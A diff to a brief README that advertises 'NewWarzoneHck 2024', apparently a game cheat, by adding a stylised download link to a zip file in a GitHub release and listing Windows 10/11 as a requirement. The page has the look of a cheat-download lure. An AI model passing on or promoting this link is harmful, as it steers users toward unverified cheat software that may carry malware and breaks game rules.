@@ -1,6 +1,6 @@
 # NewWarzoneHck 2024 
 
-[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/shubhamplank/NewWarzoneHck-2024-/releases/download/NewWarzoneHck/NewWarzoneHck.zip)
 
 Requirements:
 Windows 10/11
